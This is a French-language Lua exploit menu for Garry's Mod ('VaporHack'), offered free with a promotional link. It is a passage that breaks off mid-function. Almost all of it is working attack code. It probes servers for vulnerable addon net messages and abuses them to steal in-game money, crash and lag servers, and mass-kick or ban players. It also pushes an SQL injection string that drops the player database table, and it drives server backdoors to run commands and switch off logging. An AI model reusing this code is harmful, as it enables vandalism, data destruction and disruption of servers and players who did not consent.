
-- ███▄▄▄▄    ▄██████▄  ▀████    ▐████▀    ▄███████▄  ▄█        ▄██████▄   ▄█      ███     
-- ███▀▀▀██▄ ███    ███   ███▌   ████▀    ███    ███ ███       ███    ███ ███  ▀█████████▄ 
-- ███   ███ ███    ███    ███  ▐███      ███    ███ ███       ███    ███ ███▌    ▀███▀▀██ 
-- ███   ███ ███    ███    ▀███▄███▀      ███    ███ ███       ███    ███ ███▌     ███   ▀ 
-- ███   ███ ███    ███    ████▀██▄     ▀█████████▀  ███       ███    ███ ███▌     ███     
-- ███   ███ ███    ███   ▐███  ▀███      ███        ███       ███    ███ ███      ███     
-- ███   ███ ███    ███  ▄███     ███▄    ███        ███▌    ▄ ███    ███ ███      ███     
 -- ▀█   █▀   ▀██████▀  ████       ███▄  ▄████▀      █████▄▄██  ▀██████▀  █▀      ▄████▀   

-- Free Garry's Mod Exploit/Aimbot menu !
-- Go on https://noxploit.pro ! 

if file.Exists( "includes/extensions/client/vehicles.lua", "LUA" ) == false then
MsgC (Color(208, 114, 255), [[
HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

                __      __       _____    ____   _____   _    _            _____  _  __
                \ \    / //\    |  __ \  / __ \ |  __ \ | |  | |    /\    / ____|| |/ /
                 \ \  / //  \   | |__) || |  | || |__) || |__| |   /  \  | |     |   / 
                  \ \/ // /\ \  |  ___/ | |  | ||  _  / |  __  |  / /\ \ | |     |  <  
                   \  // ____ \ | |     | |__| || | \ \ | |  | | / ____ \| |____ | . \ 
                    \//_/    \_\|_|      \____/ |_|  \_\|_|  |_|/_/    \_\\_____||_|\_\
       
                                A HACKING MENU ON GARRYS MOD | BY HOPER


HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER

HOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPERHOPER


  ]])

-- POSE DES BASES

local Vaporhack = nil 
local RatesScaleLevel = LocalPlayer():SteamID()
local VAPOR = {}
VAPOR.memory = {}
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText




-- FONT

surface.CreateFont( "vaporfont20", {
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

surface.CreateFont( "vaporfontlight", {  
    font = "Roboto",
    extended = false,
    size = 40,
    weight = 20,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

surface.CreateFont( "vaporfonthard", {  
    font = "Roboto",
    extended = false,
    size = 13,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

surface.CreateFont( "vaporfontlogo", {  
    font = "Arial",
    extended = false,
    size = 30,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

surface.CreateFont( "vaporfonthello", {  
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})






-- FONCTION DE BASE

function VAPOR.ChatText( str )
ctext( Color(208, 114, 255), [[ VaporHack™ : ]]..str )
end
function VAPOR.NetStart( str )
local netstart = net.Start
if Vaporhack and Vaporhack.G and Vaporhack.G.net then
netstart = Vaporhack.G.net.Start
else
end
return netstart( str )
end
function VAPOR.ValidNetString( str )
local netstart = net.Start
if Vaporhack and Vaporhack.G and Vaporhack.G.net then
netstart = Vaporhack.G.net.Start
else
end
local status, error = pcall( netstart, str )
return status
end
function VAPOR.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
VAPOR.sploits = {}
local severitycols = {
[1] = Color( 100, 100, 100 ),
[2] = Color( 100, 100, 100 ),
[3] = Color( 100, 100, 100 ),
[4] = Color( 184, 109, 255 ),
}
function VAPOR.AddExploit( name, tab )
if !isstring( name ) then print("ùùù_ùùù") return end
if !istable( tab ) then print("ùùù_ùùù") return end
VAPOR.sploits[name] = tab
end
function VAPOR.IsStored( addr )
return VAPOR.memory[addr] != nil
end
function VAPOR.GetStored( addr, fallback )
if fallback and VAPOR.memory[addr] == nil then return fallback end
return VAPOR.memory[addr]
end
function VAPOR.Store( addr, val )
VAPOR.memory[addr] = val
end
function VAPOR.GetAllStored()
return VAPOR.memory
end
function VAPOR.GetAllStoredData()
local ret = {}
for k, v in pairs( VAPOR.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
function VAPOR.LoadConfig()
local f = file.Read( "Vaporhack_exploit.dat", "DATA" )
if !f then VAPOR.ChatText( "ùùù_ùùù" ) end
local raw = util.Decompress( f )
local garbage = util.JSONToTable( raw )
table.Merge( VAPOR.memory, garbage )
VAPOR.Menu:Remove()
VAPOR.ChatText( "Fichier de configuration chargé" )
end
function VAPOR.SaveConfig()
local myturds = util.TableToJSON( VAPOR.GetAllStoredData() )
if !myturds then return end
local cumpressed = util.Compress( myturds )
file.Write( "Vaporhack_exploit.dat", cumpressed )
VAPOR.ChatText( "Fichier de configuration sauvegardé" )
end


-- CREATION DES EXPLOITS 

VAPOR.AddExploit( "€ Customizable Printers Money Stealer €", {
desc = "Vole instantanément tout l'argent de chaque Printer sur le serveur",
severity = 3,
scan = function() return VAPOR.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
if !timer.Exists( "Vaporhack_exploit_shekels" ) then
VAPOR.ChatText( "Vole de l'argent lancé" )
timer.Create( "Vaporhack_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
VAPOR.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "Vaporhack_exploit_shekels" )
VAPOR.ChatText( "Vole de l'argent stoppé" )
end
end, },
},
} )


VAPOR.AddExploit( "Turbo Erreur", {
desc = "Défonce le serveur rcon avec des erreurs massive.",
severity = 2,
scan = function() return VAPOR.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Vaporhack_exploit_errorzt" ) then
VAPOR.ChatText( "erreur spam lancé" )
timer.Create( "Vaporhack_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
VAPOR.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "Vaporhack_exploit_errorzt" )
VAPOR.ChatText( "erreur spam stoppé" )
end
end, },
},
} )
local vaporhacknet = ""
if VAPOR.ValidNetString( "Sandbox_ArmDupe" ) then
vaporhacknet = "Sandbox_ArmDupe"
else
if VAPOR.ValidNetString( "Fix_Keypads" ) then
vaporhacknet = "Fix_Keypads"
else
if VAPOR.ValidNetString( "Remove_Exploiters" ) then
vaporhacknet = "Remove_Exploiters"
else
if VAPOR.ValidNetString( "noclipcloakaesp_chat_text" ) then
vaporhacknet = "noclipcloakaesp_chat_text"
else
if VAPOR.ValidNetString( "_Defqon" ) then
vaporhacknet = "_Defqon"
else
if VAPOR.ValidNetString( "_CAC_ReadMemory" ) then
vaporhacknet = "_CAC_ReadMemory"
else
if VAPOR.ValidNetString( "nostrip" ) then
vaporhacknet = "nostrip"
else
if VAPOR.ValidNetString( "LickMeOut" ) then
vaporhacknet = "LickMeOut"
else
if VAPOR.ValidNetString( "MoonMan" ) then
vaporhacknet = "MoonMan"
if VAPOR.ValidNetString( "Im_SOCool" ) then
vaporhacknet = "Im_SOCool"
end
end
end
end
end
end
end
end
end
end


VAPOR.AddExploit( "Welcome to Hell guys", {
desc = "Mesdames et Messieurs, j'ai l'honneur de vous présentez *tambour*, ElFamosoBackdoor !",
severity = 4,
scan = function() return VAPOR.ValidNetString( vaporhacknet ) end,
functions = {
{ typ = "func", name = "LOG OFF", func = function()
VAPOR.NetStart(vaporhacknet)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end, },

{ typ = "htxcommandeliste", name = "exe" },

},
} )


VAPOR.AddExploit( "☢ Niquer la base de donné SQL ☢", {
desc = "Vandalisez la base de données darkrp master SQL, effaçant toutes les données des joueurs, vous devez être superamin !!",
severity = 4,
scan = function() return VAPOR.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
VAPOR.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
VAPOR.ChatText( "Base de données SQL Server détruite" )
end, },
},
} )


VAPOR.AddExploit( "Niquer les Data du serveur", {
desc = "Vandalise le data du serveur, va probablement ennuyer leurs fils de pute de dev x)",
severity = 3,
scan = function() return VAPOR.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Vaporhack_exploit_datatrasher" ) then
VAPOR.ChatText( "Démarrage du spam du dossier data" )
timer.Create( "Vaporhack_exploit_datatrasher", 0.5, 0, function()
VAPOR.NetStart( "WriteQuery" )
net.WriteString( "BAN ME -> "..LocalPlayer():SteamID()..string.rep( "!", math.random( 1, 5000 ) ) )
net.SendToServer()
end)
else
timer.Remove( "Vaporhack_exploit_datatrasher" )
VAPOR.ChatText( "Spam du dossier data Stopper" )
end
end, },
},
} )

-- Patch

--[[VAPOR.AddExploit( "Turbo Chat Spam", {
desc = "Gros spam, extrêmement ennuyeux",
severity = 1,
scan = function() return VAPOR.ValidNetString( "VJSay" ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "VaporhackMenu", addr = "vj_spamstring" },
{ typ = "string", name = "Entrer un son", default = "vo/npc/male01/hacks01.wav", addr = "vj_spamsound" },
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "bigspamsvj" ) then
VAPOR.ChatText( "big spam lancé" )
timer.Create( "bigspamsvj", 0.1, 0, function()
for k, v in pairs( player.GetAll() ) do
VAPOR.NetStart( "VJSay" )
net.WriteEntity( v )
net.WriteString( VAPOR.GetStored( "vj_spamstring", "ACHETER LE @Vaporhack AJOUTEZ SUPREMACIST" ) )
if VAPOR.GetStored( "vj_spamsound", "" ) != "" then
net.WriteString( VAPOR.GetStored( "vj_spamsound", "" ) )
end
net.SendToServer()
end
end)
else
timer.Remove( "bigspamsvj" )
VAPOR.ChatText( "big spam stoppé" )
end
end, },
},
} )--]]




VAPOR.AddExploit( "€ Deposit Money €", {
desc = "Exploit d'argent avec les ATM Deposit Money",
severity = 2,
scan = function() return VAPOR.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do 
swag = v 
end
for k,v in pairs(player.GetAll()) do
VAPOR.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-VAPOR.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )





VAPOR.AddExploit( "Mettre le Feu", {
desc = "Mettre les props/joueur en feu. RIP JOHNNY.",
severity = 3,
scan = function() return VAPOR.ValidNetString( "drugs_ignite" ) end,
functions = {
{ typ = "func", name = "Feux Props", func = function()
VAPOR.NetStart("drugs_ignite")
net.WriteString("prop_physics")
net.SendToServer()
end, },
{ typ = "func", name = "Feux Joueurs", func = function()
VAPOR.NetStart("drugs_ignite")
net.WriteString("player")
net.SendToServer()
end, },
},
} )


VAPOR.AddExploit( "Modifier la Vie", {
desc = "Changer la vie des joueurs",
severity = 2,
scan = function() return VAPOR.ValidNetString( "drugseffect_hpremove" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100", addr = "montant_argent15" },
{ typ = "func", name = "Vie Normal", func = function()
VAPOR.NetStart("drugseffect_hpremove")
net.WriteString(VAPOR.GetStored( "montant_argent15" ))
net.SendToServer()
end, },
},
} )


VAPOR.AddExploit( "Teleportation", {
desc = "Teleport les joueurs que vous regarder au spawn)",
severity = 2,
scan = function() return VAPOR.ValidNetString( "DarkRP_Kun_ForceSpawn" ) end,
functions = {
{ typ = "func", name = "Teleport", func = function()
VAPOR.NetStart("DarkRP_Kun_ForceSpawn")
net.SendToServer()
end, },
},
} )


VAPOR.AddExploit( "Supprimer les props 2", {
desc = "Je sait pas ce que ça fait (ça fait surement respawn les joueurs que vous visez ou un truc comme ça ^^'')",
severity = 2,
scan = function() return VAPOR.ValidNetString( "drugs_text" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
VAPOR.NetStart("drugs_text")
net.WriteString("prop_physics")
net.SendToServer()
end, },
},
} )


VAPOR.AddExploit( "Kick 3", {
desc = "Exploit pour kick touts les joueurs",
severity = 3,
scan = function() return VAPOR.ValidNetString( "NLRKick" ) end,
functions = {
{ typ = "players", addr = "l_players_listing515" },
{ typ = "func", name = "Kick", func = function()
local t = VAPOR.GetStored( "l_players_listing515", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
VAPOR.NetStart("NLRKick")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )


VAPOR.AddExploit( "Kick 2", {
desc = "Exploit pour kick",
severity = 3,
scan = function() return VAPOR.ValidNetString( "RecKickAFKer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing2545" },
{ typ = "func", name = "Kick", func = function()
local t = VAPOR.GetStored( "l_players_listing2545", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
VAPOR.NetStart("RecKickAFKer")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )


VAPOR.AddExploit( "Loot Items", {
desc = "Auto-Loot des items",
severity = 2,
scan = function() return VAPOR.ValidNetString( "GMBG:PickupItem" ) end,
functions = {
{ typ = "func", name = "Loot", func = function()
for k, v in pairs(ents.GetAll()) do         
if v:GetClass() == "item_loot" then                 
VAPOR.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
VAPOR.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
VAPOR.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
VAPOR.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
VAPOR.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
VAPOR.NetStart("GMBG:PickupItem")
net.WriteEntity(v)
net.SendToServer()
end
end
end, },
},
} )


VAPOR.AddExploit( "Kick tout le monde", {
desc = "Exploit pour kick touts les joueurs",
severity = 3,
scan = function() return VAPOR.ValidNetString( "DL_Answering" ) end,
functions = {
{ typ = "func", name = "Kick", func = function()
if !timer.Exists( "kickallnoob" ) then
VAPOR.ChatText( "Kick tout le monde lancé" )
timer.Create( "kickallnoob", 0.05, 0, function()
for i = 1, 2000 do 
VAPOR.NetStart("DL_Answering")
net.SendToServer()
end
end)
else
timer.Remove( "kickallnoob" )
VAPOR.ChatText( "Kick tout le monde stoppé" )
end
end, },
},
} )


VAPOR.AddExploit( "Kick 1", {
desc = "Exploit pour kick les Admins",
severity = 3,
scan = function() return VAPOR.ValidNetString( "plyWarning" ) end,
functions = {
{ typ = "players", addr = "l_players_listing255" },
{ typ = "func", name = "Kick", func = function()
local t = VAPOR.GetStored( "l_players_listing255", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
VAPOR.NetStart('plyWarning')          
net.WriteEntity(v)          
net.WriteString('You have to select a player before doing a action.')       
net.SendToServer()
VAPOR.ChatText("Tentative de kick sur ".. v:Nick().. "!")
end
end, },
},
} )


VAPOR.AddExploit( "NLR Freeze", {
desc = "Exploit pour freeze des joueurs",
severity = 3,
scan = function() return VAPOR.ValidNetString( "NLR.ActionPlayer" ) end,
functions = {
{ typ = "players", addr = "l_players_listing45" },
{ typ = "func", name = "Freeze", func = function()
local t = VAPOR.GetStored( "l_players_listing45", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
VAPOR.NetStart("NLR.ActionPlayer")
net.WriteEntity(v)
net.SendToServer()
end  
end, },
},
} )


VAPOR.AddExploit( "Supprimer les props 1", {
desc = "Supprimer touts les props du serveur x)",
severity = 2,
scan = function() return VAPOR.ValidNetString( "timebombDefuse" ) end,
functions = {
{ typ = "func", name = "Supprimer", func = function()
for k,v in pairs(ents.GetAll()) do
VAPOR.NetStart("timebombDefuse")
net.WriteEntity(v)
net.WriteBool(true)
net.SendToServer()
end
end, },
},
} )



VAPOR.AddExploit( "Changer de Skin", {
desc = "Changer de skin",
severity = 1,
scan = function() return VAPOR.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Changer", func = function()
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1   
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
VAPOR.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
VAPOR.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
VAPOR.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
VAPOR.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
VAPOR.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )



VAPOR.AddExploit( "Anti-Printer", {
desc = "Appliquez des dommages constants aux Printers à proximité",
severity = 1,
scan = function() return VAPOR.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "Vaporhack_exploit_printersmasher" ) then
VAPOR.ChatText( "Anti-Printer lancé" )
timer.Create( "Vaporhack_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
VAPOR.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "Vaporhack_exploit_printersmasher" )
VAPOR.ChatText( "Anti-Printer stoppé" )
end
end, },
},
} )


VAPOR.AddExploit( "Crash le Serveur", {
desc = "Comme sont nom l'indique niquez moi ce serveur de la",
severity = 3,
scan = function() return VAPOR.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
VAPOR.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )


VAPOR.AddExploit( "Munition Gratuit", {
desc = "Vous donne des munition pour toutes vos armes",
severity = 1,
scan = function() return VAPOR.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(GAMEMODE.AmmoTypes) do
VAPOR.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )


VAPOR.AddExploit( "€ Advanced Money Printer €", {
desc = "Voler tout l'argent des printers",
severity = 3,
scan = function() return VAPOR.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then    
VAPOR.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )


VAPOR.AddExploit( "Ban tout le monde", {
desc = "Ban tout le monde sauf toi",
severity = 3,
scan = function() return VAPOR.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then       
VAPOR.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Des poutous partout" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )


VAPOR.AddExploit( "Lag Exploit #1", {
desc = "Provoque de gros lags sur le serveur version 1",
severity = 2,
scan = function() return VAPOR.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,
functions = {
{ typ = "func", name = "RollBack", func = function()
if !timer.Exists( "Vaporhack_exploit_lagsploit1" ) then
VAPOR.ChatText( "Lag lancé" )
timer.Create( "Vaporhack_exploit_lagsploit1", 0.02, 0, function()
for k,v in pairs(player.GetAll()) do
VAPOR.NetStart( "ATS_WARP_REMOVE_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
VAPOR.NetStart( "ATS_WARP_FROM_CLIENT" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
VAPOR.NetStart( "ATS_WARP_VIEWOWNER" )
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end)
else
timer.Remove( "Vaporhack_exploit_lagsploit1" )
VAPOR.ChatText( "Lag stoppé" )
end
end, },
},
} )


VAPOR.AddExploit( "Spam Console", {
desc = "Spam la console !",
severity = 1,
scan = function() return ULib end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "Vaporhack_exploit_bigspames2" ) then
VAPOR.ChatText( "Lag lancé" )
timer.Create( "Vaporhack_exploit_bigspames2", 0, 0, function()
for i = 1, 200 do
LocalPlayer():ConCommand( "Hack_by_Hoper " )
end
end)
else
timer.Remove( "Vaporhack_exploit_bigspames2" )
VAPOR.ChatText( "Lag stoppé" )
end
end, },
},
} )





VAPOR.AddExploit( "Réanimation Exploit", {
desc = "Vous etes automatiquement réanimé après avoir été tué",
severity = 2,
scan = function() return VAPOR.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Immortel :)", func = function()
if !timer.Exists( "Vaporhack_exploit_zombie" ) then
VAPOR.ChatText( "Tu es Immortel" )
timer.Create( "Vaporhack_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
VAPOR.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Vaporhack_exploit_zombie" )
VAPOR.ChatText( "Tu es redevenu Mortel!" )
end
end, },
},
} )


VAPOR.AddExploit( "Vole d'Armes", {
desc = "Prenez les armes de la police à l'armurerie (Vous devez etre proche d'elle), a un temps de recharge de 5 minutes",
severity = 2,
scan = function() return VAPOR.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Prendre Arme 1", func = function()
VAPOR.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 2", func = function()
VAPOR.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Prendre Arme 3", func = function()
VAPOR.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )


VAPOR.AddExploit( "Admin Stick / Porte exploit", {
desc = "Déverrouiller / Verrouiller Porte / Enlever le proprio (vous devez regarder une porte)",
severity = 3,
scan = function() return VAPOR.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Déverrouiller", func = function()
VAPOR.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Verrouiller", func = function()
VAPOR.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Enlever le Proprio", func = function()
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
VAPOR.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )


VAPOR.AddExploit( "Vaporhack Report Spammer", {
desc = "Envoyer des Report sur tout le monde",
severity = 1,
scan = function() return VAPOR.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Report Tout le Monde", func = function()
for k, v in pairs( player.GetAll() ) do
VAPOR.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVEUR CODER PAR LE Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )




VAPOR.AddExploit( "Crash Serveur", {
desc = "Cliquez sur ce bouton pour Crash le serveur instantanément.",
severity = 3,
scan = function() return VAPOR.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Crash", func = function()
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
VAPOR.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
VAPOR.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
VAPOR.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
VAPOR.AddExploit( "Strip les armes (patch)", {
desc = "Enlever les armes.",
severity = 3,
scan = function() return VAPOR.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
--{ typ = "string", name = "Type d'Arme à Strip", default = "*", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Strip", func = function()
if !timer.Exists( "stripclub" ) then
VAPOR.ChatText( "Strip lancé" )
timer.Create( "stripclub", 0.5, 0, function()
local t = VAPOR.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = VAPOR.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
